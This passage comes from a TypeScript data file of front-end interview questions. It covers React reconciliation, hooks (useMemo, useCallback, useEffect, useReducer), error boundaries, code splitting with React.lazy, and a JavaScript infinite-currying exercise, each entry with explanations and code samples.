Where this matters in React: setting state with \`setState({ ...prev, nested: prev.nested })\` is shallow — mutating \`prev.nested\` inside still mutates state and breaks reconciliation. Use the immutable update pattern or a library like Immer.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Shallow surprise",
          code: `const a = { user: { name: "Ada" } };
const b = { ...a };
b.user.name = "Bea";
console.log(a.user.name); // "Bea" — same reference`,
        },
        {
          language: "ts",
          caption: "Deep copy with structuredClone",
          code: `const a = { user: { name: "Ada" }, when: new Date(), tags: new Set(["x"]) };
const b = structuredClone(a);
b.user.name = "Bea";
console.log(a.user.name); // "Ada" — independent
console.log(b.tags instanceof Set); // true — Set survived`,
        },
      ],
      followUps: [
        "Why does JSON.parse(JSON.stringify()) lose functions and undefined?",
        "How do you deep-copy an object with cycles?",
        "How does structural sharing (Immer / Immutable.js) avoid full deep copies?",
      ],
      commonMistakes: [
        "Believing `{ ...obj }` is a deep copy.",
        "Using JSON round-trip on data with Dates / Maps / undefined / functions and being surprised.",
        "Mutating state that came from a shallow spread.",
      ],
      performanceConsiderations: [
        "structuredClone is O(n) but ships in C++ — usually faster than the JSON trick and safer.",
        "Deep cloning huge state trees per change is wasteful; prefer structural sharing (Immer) or normalized state.",
      ],
      edgeCases: [
        "structuredClone throws on functions, DOM nodes, class instances with private fields, and Symbol-keyed properties.",
        "Cyclic references break JSON.stringify but not structuredClone.",
      ],
      realWorldExamples: [
        "Redux/Zustand state updates rely on shallow-copy-with-replacement — that's why mutation breaks ===-based selectors.",
        "Immer uses copy-on-write proxies to give you ergonomic mutation with a structurally-shared deep copy result.",
      ],
      seniorDiscussion:
        "Senior signal: explain structural sharing, the cost of deep cloning vs reference equality for memoization, and when to normalize state instead of cloning it.",
      relatedSlugs: ["difference-between-shallow-copy-vs-structural-sharing"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "Reconciliation and the Virtual DOM",
    aliases: ["reconciliation virtual dom", "virtual dom reconciliation", "react virtual dom"],
    question: {
      id: "reconciliation-and-virtual-dom",
      slug: "reconciliation-and-virtual-dom",
      title: "Reconciliation and the Virtual DOM — how does React decide what to update?",
      category: "react",
      subcategory: "Rendering",
      tags: ["reconciliation", "virtual-dom", "fiber", "keys", "diffing"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "React renders an in-memory tree, diffs it against the previous one with O(n) heuristics (same type = update props; different type = replace; keys identify list items), then commits the minimal DOM mutations.",
      answer: `The **Virtual DOM** is a lightweight tree of plain JS objects describing what the UI should look like. **Reconciliation** is the algorithm React runs to compare the new tree to the previous one and produce the minimal set of real DOM mutations.

Two heuristics keep the diff O(n) instead of O(n³):

1. **Different element types ⇒ rebuild.** \`<div>\` → \`<span>\` throws away the old subtree and mounts new.
2. **Same type ⇒ patch in place.** Update changed props/attributes; recurse into children.

For lists, React aligns children by **\`key\`**. Without keys (or with index keys when items reorder), React diffs positionally — destroying and recreating components, losing state and forcing remounts. Stable, unique keys (usually a record id) let React match nodes across reorders.

Since React 16, this work runs on **Fiber**: the diff is interruptible and can be split across frames so a long render doesn't jank the UI. The "render phase" produces a work tree; the "commit phase" applies all DOM mutations synchronously in one pass.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Bad keys cause state loss on reorder",
          code: `// Index keys — when the list reorders, React matches by position
//   so input value/focus moves to the wrong row.
items.map((item, i) => <Row key={i} item={item} />)

// Stable id — React matches by identity; state stays with the right row.
items.map((item) => <Row key={item.id} item={item} />)`,
        },
      ],
      followUps: [
        "What does Fiber add over the old stack reconciler?",
        "Why are array indexes a bad key when items can be reordered or filtered?",
        "How does React decide whether to bail out of re-rendering a subtree?",
      ],
      commonMistakes: [
        "Using array index as key for dynamic, reorderable lists.",
        "Wrapping content in an extra `div` only on one branch — flips the element type and re-mounts.",
        "Believing the Virtual DOM is faster than direct DOM — it's a programming model, not raw speed.",
      ],
      performanceConsiderations: [
        "Stable keys avoid unnecessary unmount/remount, preserving DOM nodes, focus, and child component state.",
        "`React.memo` + reference-stable props lets the diff bail out at a subtree boundary.",
      ],
      edgeCases: [
        "Conditional `null` children change the children array shape — keys help here too.",
        "Portals reconcile within their host parent but live in a different DOM subtree.",
      ],
      realWorldExamples: [
        "Drag-and-drop lists rely on stable keys so the dragged row keeps its DOM node and animation through the diff.",
      ],
      seniorDiscussion:
        "Senior signal: discuss Fiber's two-phase commit, time-slicing, how Suspense interacts with reconciliation, and the decision tree for `React.memo` vs `useMemo` vs lifting state.",
      relatedSlugs: ["explain-react-fiber-deeply", "how-do-concurrent-rendering-and-transitions-work"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Controlled vs uncontrolled components",
    aliases: ["controlled vs uncontrolled", "controlled uncontrolled components react"],
    question: {
      id: "controlled-vs-uncontrolled-components",
      slug: "controlled-vs-uncontrolled-components",
      title: "Controlled vs uncontrolled components in React",
      category: "react",
      subcategory: "Forms",
      tags: ["controlled", "uncontrolled", "forms", "refs", "useState"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "Controlled = React state owns the value, the DOM mirrors it. Uncontrolled = the DOM owns the value, React reads it on demand via a ref.",
      answer: `**Controlled.** The component sets \`value\` from React state and updates it on every \`onChange\`. The DOM is a pure projection of React state. Pros: easy validation, formatting, conditional disable, single source of truth. Cons: re-renders on every keystroke.

**Uncontrolled.** The DOM holds the value. React reads it via a ref when needed (typically on submit) or with \`defaultValue\`. Pros: less re-render churn, simpler for "fire-and-forget" forms, easier integration with non-React widgets. Cons: harder to derive UI from the value (live previews, conditional fields).

Default to controlled in React. Switch to uncontrolled (or use a form library like react-hook-form, which is uncontrolled-by-default) when input perf actually matters at the keystroke level — large forms, autocomplete grids.

Hybrid: \`defaultValue\` + ref is uncontrolled; \`value\` + \`onChange\` is controlled. Mixing them produces the warning *"A component is changing an uncontrolled input to be controlled"* — pick one and stick.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Controlled input",
          code: `function NameField() {
  const [name, setName] = useState("");
  return (
    <input
      value={name}
      onChange={(e) => setName(e.target.value)}
    />
  );
}`,
        },
        {
          language: "tsx",
          caption: "Uncontrolled with ref",
          code: `function NameField() {
  const ref = useRef<HTMLInputElement>(null);
  const submit = () => console.log(ref.current?.value);
  return (
    <>
      <input defaultValue="" ref={ref} />
      <button onClick={submit}>Save</button>
    </>
  );
}`,
        },
      ],
      followUps: [
        "How does react-hook-form get controlled-like ergonomics with uncontrolled perf?",
        "Why does mixing value and defaultValue cause a warning?",
        "How would you debounce a controlled input without losing keystrokes?",
      ],
      commonMistakes: [
        "Initializing controlled value as `undefined` then later setting a string — flips controlled state.",
        "Validating only on submit when the field is controlled (you can validate per-keystroke).",
        "Forgetting that file inputs are always uncontrolled by browser design.",
      ],
      performanceConsiderations: [
        "Controlled inputs in a 100-row table re-render a lot — colocate state with the row, or go uncontrolled.",
      ],
      edgeCases: [
        "`<input type='file'>` cannot be controlled — its value can only be cleared, never set.",
        "Selects with `multiple` need an array `value`; passing a string silently fails.",
      ],
      realWorldExamples: [
        "react-hook-form registers refs, reads on submit — that's why it stays fast on huge forms.",
      ],
      seniorDiscussion:
        "Senior signal: discuss form-state architecture (per-field state vs single object vs library), accessibility (label association, error announcement), and how Suspense + transitions help heavy validation feel instant.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 8,
    },
  },

  {
    title: "useMemo vs useCallback",
    aliases: ["usememo vs usecallback", "differences between useMemo and useCallback"],
    question: {
      id: "usememo-vs-usecallback",
      slug: "usememo-vs-usecallback",
      title: "Differences between useMemo and useCallback",
      category: "react",
      subcategory: "Hooks",
      tags: ["usememo", "usecallback", "memoization", "react", "hooks"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "useMemo memoizes a *value*; useCallback memoizes a *function reference*. Both rerun only when their dependency array changes. Both are perf hints, not correctness guarantees.",
      answer: `Both are memoization hooks tied to a dependency array.

- **\`useMemo(() => compute(a, b), [a, b])\`** — runs \`compute\` and remembers the **return value** between renders unless \`a\` or \`b\` change.
- **\`useCallback(fn, [a, b])\`** — equivalent to \`useMemo(() => fn, [a, b])\`. It remembers the **function identity** so children with reference equality (e.g. \`React.memo\`) don't re-render.

When to reach for them:
1. **Stable identity for memoized children** — pass a callback to \`React.memo(Child)\` without busting its memoization.
2. **Expensive pure computation** — sort/filter/derive on a 10k-row dataset.
3. **Stable reference for effect deps** — avoid an effect re-running every render because the function identity changes.

When NOT to:
- Wrapping every value/handler "just in case." The hook itself has overhead (deps comparison, allocation) and adds noise. Profile first.
- Memoizing primitives — they're already cheap to compare.

React 19's compiler (auto-memoization) eliminates most manual uses, but understanding when memoization helps is still expected.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "useMemo for derived state",
          code: `const sorted = useMemo(
  () => rows.toSorted((a, b) => a.name.localeCompare(b.name)),
  [rows],
);`,
        },
        {
          language: "tsx",
          caption: "useCallback to keep React.memo working",
          code: `const Row = React.memo(function Row({ onPick, item }: Props) { /* ... */ });

function List({ items, pick }) {
  // Without useCallback, onPick is a new reference each render
  // and Row re-renders every time despite React.memo.
  const onPick = useCallback((id: string) => pick(id), [pick]);
  return items.map((it) => <Row key={it.id} item={it} onPick={onPick} />);
}`,
        },
      ],
      followUps: [
        "How does the React 19 compiler change when you reach for useMemo/useCallback?",
        "What's the actual cost of useMemo? When does it cost more than the work it saves?",
        "How would you stabilize a complex object prop without useMemo?",
      ],
      commonMistakes: [
        "Wrapping a cheap calculation — useMemo's bookkeeping costs more than the work.",
        "Stale deps array that omits a captured variable — silent staleness, not an error.",
        "Treating useMemo as a guarantee — React may discard the cache to free memory.",
      ],
      performanceConsiderations: [
        "Memoization only pays off when (a) the work is expensive, (b) deps actually stay stable, and (c) downstream depends on identity.",
      ],
      edgeCases: [
        "useMemo can re-run between renders when React decides to evict the cache; treat it as best-effort.",
        "Inline objects/arrays as deps defeat the optimization — they're a new reference every render.",
      ],
      realWorldExamples: [
        "Charting libraries that take a `data` prop benefit hugely from `useMemo` to avoid re-running expensive shape computations.",
      ],
      seniorDiscussion:
        "Senior signal: talk about React Compiler's auto-memoization model, the difference between identity-based memoization and structural memoization, and how to validate the win with the React Profiler.",
      relatedSlugs: ["how-would-you-prevent-unnecessary-re-renders-in-a-dashboard-with-live-updates"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "Error boundaries and crash recovery",
    aliases: ["error boundaries", "react error boundary", "handle errors react"],
    question: {
      id: "error-boundaries-crash-recovery",
      slug: "error-boundaries-crash-recovery",
      title: "How do error boundaries work, and how do you design crash recovery?",
      category: "react",
      subcategory: "Errors",
      tags: ["error-boundary", "componentDidCatch", "crash-recovery", "resilience"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Error boundaries are class components that implement getDerivedStateFromError + componentDidCatch. They catch render-phase errors below them and let you show a fallback instead of unmounting the whole tree.",
      answer: `An **error boundary** is a class component (no functional equivalent yet) that implements:

- \`static getDerivedStateFromError(error)\` — returns the new state used to render a fallback.
- \`componentDidCatch(error, info)\` — side effect, e.g. log to Sentry.

It catches errors thrown in **render**, **lifecycle**, and **constructors** of the components below it. It does **not** catch:

- Async errors in event handlers (use try/catch).
- Errors in setTimeout / Promises (handle them where they fire).
- Errors in the boundary itself (use a higher boundary).
- SSR errors (Next.js has its own error.tsx).

Design pattern: nest boundaries strategically. One at the page level for catastrophic failure, one per major feature region (sidebar, content panel) so a broken widget doesn't blank the whole app, and one around third-party content. Pair with a "reset" key (e.g. route key) so the boundary clears on navigation.

In Next.js App Router, \`error.tsx\` is a client component that wraps a route segment in an automatic boundary with a \`reset()\` function.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Minimal error boundary",
          code: `class Boundary extends React.Component<
  { fallback: React.ReactNode; children: React.ReactNode },
  { hasError: boolean }
> {
  state = { hasError: false };
  static getDerivedStateFromError() { return { hasError: true }; }
  componentDidCatch(err: Error, info: React.ErrorInfo) {
    Sentry.captureException(err, { extra: info });
  }
  render() {
    return this.state.hasError ? this.props.fallback : this.props.children;
  }
}`,
        },
      ],
      followUps: [
        "Why is there no functional-component error boundary?",
        "How do you reset an error boundary after a fix (e.g. navigation)?",
        "How do you handle errors thrown inside an event handler?",
      ],
      commonMistakes: [
        "Putting one boundary at the root only — the whole app blanks on a small bug.",
        "Expecting boundaries to catch async errors or event handler errors.",
        "Forgetting to ship the error to a logger; users see a fallback but the team never knows.",
      ],
      performanceConsiderations: [
        "Boundaries are cheap. The cost is in your fallback UI — keep it lightweight so it doesn't compound a bad situation.",
      ],
      edgeCases: [
        "If the fallback itself throws, the next boundary up catches it — design fallbacks defensively.",
        "Suspense + error boundaries: an error inside a suspended subtree bubbles to the nearest boundary above the Suspense.",
      ],
      realWorldExamples: [
        "Per-widget boundaries on dashboards — a misbehaving chart shows 'Failed to load' while the rest of the page works.",
      ],
      seniorDiscussion:
        "Senior signal: discuss the boundary placement strategy (page / region / widget), correlation between Suspense boundaries and error boundaries, and how to integrate with logging + feature flags to dark-launch risky components.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Currying for infinite sum",
    aliases: ["currying infinite sum", "sum curry", "infinite currying"],
    question: {
      id: "currying-for-infinite-sum",
      slug: "currying-for-infinite-sum",
      title: "Implement currying for infinite sum: sum(10)(20)(30)() === 60",
      category: "javascript",
      subcategory: "Functional",
      tags: ["currying", "closures", "functional", "machine-coding"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Return a function that either accepts another argument and returns itself, or returns the running total when called with no argument. Implementation hinges on closure + a base case.",
      answer: `This question — "implement \`sum(10)(20)(30)() === 60\`" or its sibling \`mul(2)(3)(4) === 24\` — is one of the most common JavaScript closure/currying interview prompts. The interviewer is checking three things: (1) do you understand closures, (2) can you design a function that has two distinct behaviors depending on how it's called, (3) can you discuss the trade-offs of multiple solutions. There are two canonical patterns and one "showy" advanced one.

**What "currying" actually means.** Currying decomposes a function of N arguments into a chain of N functions of 1 argument each: \`f(a, b, c)\` → \`f(a)(b)(c)\`. Each call captures one argument in a closure and returns a new function waiting for the next. *Infinite currying* extends this idea to a variable number of calls, with a termination signal.

**Approach 1: terminate with an empty call \`()\`.**

The returned function is *dual-purpose*: called *with* an argument, it accumulates and returns itself; called *without* an argument, it returns the running total.

\`\`\`ts
function sum(a: number) {
  let total = a;
  function next(b?: number): number | typeof next {
    if (b === undefined) return total;
    total += b;
    return next;
  }
  return next;
}

sum(10)(20)(30)();             // 60
sum(1)(2)(3)(4)(5)();          // 15
\`\`\`

**Why it works.** Every invocation of \`sum\` creates a new scope with its own \`total\` variable. The \`next\` function closes over that \`total\`, so successive calls mutate the *same* binding. The closure is what makes "infinite" currying possible — there's no array, no global, just one captured variable per chain.

**Approach 2: \`valueOf\` / \`toString\` coercion (no terminator).**

You can avoid the trailing \`()\` by returning a *function object* whose \`valueOf\` returns the running total. When JavaScript needs to coerce the function to a primitive (e.g., \`+\` arithmetic, template literal interpolation, \`console.log\`), it calls \`valueOf\`.

\`\`\`ts
function sum(a: number): any {
  const next = (b: number) => sum(a + b);
  next.valueOf = () => a;
  return next;
}

sum(10)(20)(30) + 0;          // 60  — coerced via valueOf
\\\`\\\${sum(1)(2)(3)}\\\`;     // "6"
\`\`\`

This is "slick but surprising" — it relies on implicit coercion, which TypeScript can't type cleanly, and the function's identity is hard to inspect in a debugger. Mention it as a senior flourish; don't use it in production.

**Approach 3: fixed-arity currying.**

If the question is "given \`add(a, b, c)\`, write \`curry(add)\` so \`curry(add)(1)(2)(3) === 6\`," you can write a generic helper:

\`\`\`ts
function curry<T extends (...args: any[]) => any>(fn: T) {
  return function curried(...args: any[]): any {
    if (args.length >= fn.length) return fn(...args);
    return (...rest: any[]) => curried(...args, ...rest);
  };
}

const add = (a: number, b: number, c: number) => a + b + c;
curry(add)(1)(2)(3);      // 6
curry(add)(1, 2)(3);      // 6  — flexible argument grouping
curry(add)(1)(2, 3);      // 6
\`\`\`

This relies on \`fn.length\` (the declared arity) as the termination condition. Doesn't work for variadic functions.

**For \`mul(2)(3)(4) === 24\`** specifically (the file-4 phrasing), the answer is identical, swapping \`+\` for \`*\`:

\`\`\`ts
function mul(a: number) {
  return function next(b: number) {
    return mul(a * b);
  } as ((b: number) => any) & { valueOf: () => number };
}
// To make it terminate: add valueOf or use the empty-call pattern.
\`\`\`

**Talking points (the senior signal):**

- **Closure** — each chain has its own \`total\`. The function "remembers" because the engine keeps the environment record alive while \`next\` is reachable.
- **Function-as-first-class-value** — you're returning functions from functions, an idiomatic FP move.
- **Memory** — each call allocates a closure; not free for very long chains. If you needed billions of items, prefer \`array.reduce\`.
- **Type-ability** — the recursive return type \`number | typeof next\` is awkward in TypeScript; the \`valueOf\` approach is even harder to type. Mention it as a downside.
- **Alternatives** — if the API is \`sum(...nums)\`, just use rest params. Currying is for partial application and lazy evaluation, not for show.
- **Debuggability** — a chain of arrow-returning calls is hard to read in a stack trace; named inner functions help.

**Common mistakes:**

- Forgetting to capture the running total in a closure (using a module-level variable — fails for concurrent chains).
- Returning \`next()\` (calling it) instead of \`next\` (the function reference) at the recursive step.
- Using arrow class fields with state that should be per-instance (works but allocates).
- Not handling the empty-call termination case.

**Interview-ready summary:** "I'd return a function that's dual-purpose: with an argument it accumulates and returns itself, with no argument it returns the closed-over total. Each top-level call creates a fresh closure so chains are independent. The flashier \`valueOf\` variant skips the terminator but relies on implicit coercion, which I'd avoid in production."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Approach 1 — terminate with empty call",
          code: `function sum(a: number) {
  let total = a;
  function next(b?: number): any {
    if (b === undefined) return total;
    total += b;
    return next;
  }
  return next;
}

sum(10)(20)(30)();              // 60
sum(10)(20)(30)(40)(50)(60)();  // 210`,
        },
        {
          language: "ts",
          caption: "Approach 2 — implicit terminate with valueOf",
          code: `function sum(a: number) {
  const fn: any = (b: number) => sum(a + b);
  fn.valueOf = () => a;
  return fn;
}

+sum(10)(20)(30);  // 60  — coerced via valueOf`,
        },
      ],
      followUps: [
        "Implement a curry(fn, arity) that auto-curries any n-ary function.",
        "Why doesn't sum(10)(20)(30) return 60 directly without a terminator?",
        "What's the memory cost of a long curry chain?",
      ],
      commonMistakes: [
        "Forgetting the no-argument terminator and returning a function instead of the total.",
        "Using `arguments` inside an arrow function — there is no `arguments`.",
        "Not handling the first call's accumulation — initialising `total` outside `sum` (shared across calls).",
      ],
      performanceConsiderations: [
        "Each call creates a new closure frame. Fine for interview-scale; for hot paths, prefer accumulator patterns.",
      ],
      edgeCases: [
        "Calling `sum()` with no args first — guard with a default of 0.",
        "Mixing the two approaches (terminator + valueOf) makes the API unpredictable. Pick one.",
      ],
      realWorldExamples: [
        "Lodash's `_.curry` and Ramda's pervasive currying use the same closure-based technique.",
      ],
      seniorDiscussion:
        "Senior signal: discuss currying vs partial application, how it composes with point-free style, and why TypeScript's variadic tuple types make a typed curry possible (with caveats).",
      relatedSlugs: ["what-are-closures-in-javascript"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 15,
    },
  },

  // ============================================================
  // BATCH 2 — REACT HOOKS, SSR/CSR, MACHINE CODING, PACKAGE.JSON
  // ============================================================
  {
    title: "useEffect vs useLayoutEffect — when to use each",
    aliases: ["useeffect vs uselayouteffect", "useeffect uselayouteffect"],
    question: {
      id: "useeffect-vs-uselayouteffect",
      slug: "useeffect-vs-uselayouteffect",
      title: "useEffect vs useLayoutEffect — when to use each?",
      category: "react",
      subcategory: "Hooks",
      tags: ["useeffect", "uselayouteffect", "react", "rendering", "lifecycle"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Both run after the DOM is updated; useLayoutEffect runs synchronously **before** the browser paints, useEffect runs asynchronously **after** paint. Default to useEffect; reach for useLayoutEffect only when you must read or mutate layout before the user sees a flash.",
      answer: `Both hooks have the same signature and dependency semantics. The only difference is **timing**:

- **\`useEffect\`** — runs **after the browser paints** the new frame. The user sees the rendered DOM, then your effect runs. This is non-blocking and is the right default.
- **\`useLayoutEffect\`** — runs **synchronously after DOM mutations but before the browser paints**. React commits the DOM, then runs your effect, then yields to the browser to paint.

The practical rule: if your effect *measures* the DOM (\`getBoundingClientRect\`) and *writes* something based on it (e.g. positioning a tooltip), use \`useLayoutEffect\` — otherwise the user sees the unaligned tooltip for one frame, then it jumps. For everything else (data fetching, subscriptions, logging), use \`useEffect\`.

Cost: \`useLayoutEffect\` blocks paint, so a slow one delays every frame it touches. Keep the body fast.

SSR caveat: \`useLayoutEffect\` warns on the server because there's no layout to read. Either gate it behind \`typeof window !== 'undefined'\` or use the \`useIsomorphicLayoutEffect\` pattern (alias to \`useEffect\` on the server).`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Tooltip positioning — needs useLayoutEffect to avoid flash",
          code: `function Tooltip({ targetRef, children }) {
  const ref = useRef<HTMLDivElement>(null);
  useLayoutEffect(() => {
    const t = targetRef.current!.getBoundingClientRect();
    const el = ref.current!;
    el.style.top  = \`\${t.bottom + 8}px\`;
    el.style.left = \`\${t.left}px\`;
  }, [targetRef]);
  return <div ref={ref} className="absolute">{children}</div>;
}`,
        },
        {
          language: "tsx",
          caption: "Isomorphic layout effect (SSR-safe)",
          code: `import { useEffect, useLayoutEffect } from "react";
export const useIsoLayoutEffect =
  typeof window !== "undefined" ? useLayoutEffect : useEffect;`,
        },
      ],
      followUps: [
        "Why does useLayoutEffect warn during SSR?",
        "How does this relate to flushSync?",
        "When does an effect's cleanup function run, and in what order?",
      ],
      commonMistakes: [
        "Using useLayoutEffect 'just to be safe' — it blocks paint and hurts INP/LCP.",
        "Reading layout in useEffect and writing it back, causing a visible flash.",
        "Putting setState inside useLayoutEffect without a guard — easy infinite loop.",
      ],
      performanceConsiderations: [
        "useLayoutEffect bodies count toward time-to-paint. Move heavy work to useEffect or a microtask.",
        "If you only need to react to layout changes, ResizeObserver is cheaper than measuring on every render.",
      ],
      edgeCases: [
        "On SSR, useLayoutEffect doesn't run — your initial render must not depend on layout-measurement output.",
        "Concurrent rendering can discard a render mid-flight; effects only fire on committed renders.",
      ],
      realWorldExamples: [
        "Popovers, tooltips, and Floating-UI positioning rely on useLayoutEffect to avoid first-frame jumps.",
      ],
      seniorDiscussion:
        "Senior signal: discuss commit-phase ordering (mutation → layout effects → paint → passive effects), how this changes under transitions, and the SSR isomorphic pattern.",
      relatedSlugs: ["how-do-concurrent-rendering-and-transitions-work"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "useState vs useReducer — which one and when",
    aliases: ["usestate vs usereducer", "usereducer when to use"],
    question: {
      id: "usestate-vs-usereducer",
      slug: "usestate-vs-usereducer",
      title: "useState vs useReducer — which one, and when?",
      category: "react",
      subcategory: "Hooks",
      tags: ["usestate", "usereducer", "state-management", "react"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "useState is direct value-replacement, ideal for independent primitives or small objects. useReducer centralizes complex transitions in a pure function, ideal when next-state depends on the action *and* current state in non-trivial ways.",
      answer: `Both hooks store state inside the same React fiber slot. The difference is the **API shape and the discipline it encourages**:

- **\`useState\`** — \`[value, setValue]\`. Cheap, direct, and the right default. Use for booleans, strings, numbers, or small objects whose updates don't depend on each other.
- **\`useReducer\`** — \`[state, dispatch]\`. Forces you to express transitions as \`(state, action) => state\`. The pure-function shape makes complex multi-field updates testable and debuggable.

Reach for \`useReducer\` when:

1. Several pieces of state always update together (e.g. \`{ status, data, error }\`).
2. Next state depends on current state and a non-trivial action (wizard steps, undo/redo).
3. You want to pass a stable \`dispatch\` reference deep into a tree without prop-drilling \`setX\` callbacks (\`dispatch\` is referentially stable).

Both can be lazily initialized — \`useState(() => expensive())\` and \`useReducer(reducer, initialArg, init)\`.

A pragmatic test: if you find yourself writing \`setX(prev => ({ ...prev, ... }))\` and reaching across multiple fields, you've outgrown \`useState\` and reducer will read better.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Same fetch state, two styles",
          code: `// useState — fine for one-off
const [data, setData] = useState<T | null>(null);
const [error, setError] = useState<Error | null>(null);
const [loading, setLoading] = useState(false);

// useReducer — clearer when transitions are coupled
type Action =
  | { type: "start" }
  | { type: "ok"; data: T }
  | { type: "err"; error: Error };

const initial = { status: "idle", data: null, error: null } as const;

function reducer(s, a: Action) {
  switch (a.type) {
    case "start": return { status: "loading", data: null, error: null };
    case "ok":    return { status: "success", data: a.data, error: null };
    case "err":   return { status: "error",   data: null,   error: a.error };
  }
}`,
        },
      ],
      followUps: [
        "How do you lazily initialize state with useReducer?",
        "Why is dispatch referentially stable across renders?",
        "When would you graduate from useReducer to a state library (Zustand, Redux)?",
      ],
      commonMistakes: [
        "Mutating state inside the reducer — must return a new object.",
        "Putting derived values in state instead of computing them in render.",
        "Using useReducer for a single boolean — overkill.",
      ],
      performanceConsiderations: [
        "Both bail out of re-render when the new value is `===` to the old.",
        "Dispatch is stable, so passing it through context doesn't bust child memoization.",
      ],
      edgeCases: [
        "An action object created inline inside render is fine — it's the dispatched value, not a dep.",
        "useReducer with a non-pure reducer breaks Strict Mode double-invoke detection.",
      ],
      realWorldExamples: [
        "Form-state managers (react-hook-form internals, formik) use reducer-like patterns under the hood for predictable transitions.",
      ],
      seniorDiscussion:
        "Senior signal: discuss when reducer + context becomes a state-management framework, the cost of context for high-churn state, and when to switch to an external store with selector subscriptions.",
      relatedSlugs: ["context-vs-redux-vs-zustand-when-to-use-what"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 10,
    },
  },

  {
    title: "React.lazy and Suspense for code splitting",
    aliases: ["react.lazy suspense", "lazy load components react", "code splitting react"],
    question: {
      id: "react-lazy-and-suspense",
      slug: "react-lazy-and-suspense",
      title: "Using React.lazy and Suspense for component-level code splitting",
      category: "react",
      subcategory: "Code Splitting",
      tags: ["react.lazy", "suspense", "code-splitting", "performance", "lazy-loading"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "React.lazy turns a dynamic import into a component; Suspense renders a fallback while the chunk loads. Together they split bundles at component granularity without ejecting from React's render model.",
      answer: `\`React.lazy(() => import('./Heavy'))\` returns a special component that, on first render, suspends until the chunk loads. \`<Suspense fallback={...}>\` declares what to show during that suspension.

Why it matters: shipping a single 500KB main bundle slows TTI for everyone. Splitting at routes (or heavy components like a chart library) means users only download what they need for the path they took.

Where to put boundaries:

- **Route level** — every route lazy-loaded behind a \`<Suspense>\` (Next.js App Router does this automatically for \`page.tsx\`).
- **Heavy widget level** — a charting modal, an emoji picker, a markdown editor. Wrap each in its own boundary so a slow chunk doesn't blank the rest of the page.
- **Above-the-fold things should NOT be lazy** — paying a network round trip on first paint is worse than the bundle bytes.

Failure modes: a lazy import can fail (deploy in flight, network hiccup). Pair every Suspense boundary with an Error Boundary that offers a retry; \`React.lazy\` doesn't ship retry on its own.

Server-side: in Next.js prefer \`next/dynamic\` over \`React.lazy\` for SSR control (\`ssr: false\` for client-only widgets).`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Route-level split with retryable boundary",
          code: `const Settings = React.lazy(() => import("./Settings"));

<ErrorBoundary fallback={<RetryButton />}>
  <Suspense fallback={<Skeleton />}>
    <Settings />
  </Suspense>
</ErrorBoundary>`,
        },
        {
          language: "tsx",
          caption: "Retry an import that failed (network blip)",
          code: `function lazyWithRetry<T>(load: () => Promise<{ default: T }>) {
  return React.lazy(() =>
    load().catch(() => new Promise((res) => setTimeout(() => res(load()), 1000))),
  );
}`,
        },
      ],
      followUps: [
        "Why does React.lazy require a default export?",
        "When should you choose next/dynamic over React.lazy?",
        "How do you preload a lazy chunk before the user navigates?",
      ],
      commonMistakes: [
        "Lazy-loading above-the-fold content and adding a network round trip to LCP.",
        "Forgetting an error boundary — a failed chunk silently shows the fallback forever.",
        "Splitting too aggressively, ending up with hundreds of tiny chunks (HTTP overhead beats download savings).",
      ],
      performanceConsiderations: [
        "Combine with `<link rel='modulepreload'>` to start the chunk download during idle time.",
        "Use route-level prefetch (Next's `<Link prefetch>`) so the chunk is warm before the click.",
      ],
      edgeCases: [
        "Suspense without a boundary above throws — every lazy component needs one in its parent tree.",
        "Strict Mode double-invokes the import in development — that's the framework, not a bug.",
      ],
      realWorldExamples: [
        "An admin dashboard splits each feature module behind its own boundary; analysts who never open Reports never download the chart bundle.",
      ],
      seniorDiscussion:
        "Senior signal: discuss the split-by-route vs split-by-component tradeoff, prefetch strategy on hover/idle, and how RSC changes the bundle-split picture entirely (server components don't ship JS to begin with).",
      relatedSlugs: [
        "explain-lazy-loading-vs-preloading-vs-prefetching",
        "how-do-you-reduce-bundle-size-in-production",
      ],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "SSR vs SSG vs CSR — when to use each",
    aliases: ["ssr vs ssg vs csr", "rendering strategies", "ssr csr ssg"],
    question: {
      id: "ssr-vs-ssg-vs-csr",
      slug: "ssr-vs-ssg-vs-csr",
      title: "SSR vs SSG vs CSR — when to use each?",
      category: "performance",
      subcategory: "Rendering Strategy",
      tags: ["ssr", "ssg", "csr", "isr", "next.js", "rendering"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
